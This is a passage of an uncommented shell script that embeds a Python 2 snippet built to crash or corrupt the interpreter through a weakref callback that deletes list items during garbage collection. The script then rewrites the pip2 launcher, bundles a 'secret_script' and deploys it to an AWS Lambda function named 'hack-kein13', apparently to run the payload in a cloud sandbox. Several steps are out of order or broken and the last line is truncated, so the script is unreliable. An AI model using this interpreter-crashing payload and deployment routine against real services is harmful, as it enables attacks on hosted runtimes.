import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])"

target_script=$1
echo $target_script
echo $target_script > "secret_script.py"
mkdir -p ~/.local/lib/python2.7/site-packages/
sed '/^wheel/d' ~/.local/bin/pip2 > ~/.local/bin/pip2_
echo "wheel" >> ~/.local/bin/pip2_
bash ~/.local/bin/pip2_ freeze | grep -v "^pip" > "secret_reqs.txt"
touch "__init__.py"
mkdir -p python_lib/
echo "import secret_script as script" > "python_lib/dummy.py"
tar -czf app/main.tar.gz python_lib secret_reqs.txt "__init__.py"
mv "secret_script.py" python_lib
cd app/
zip -r ../temp_lambda.zip *
cd ..
aws lambda update-function-code --function-name hack-kein13 --zip-file fileb://temp_lambda.zip --publish
rm -r python_
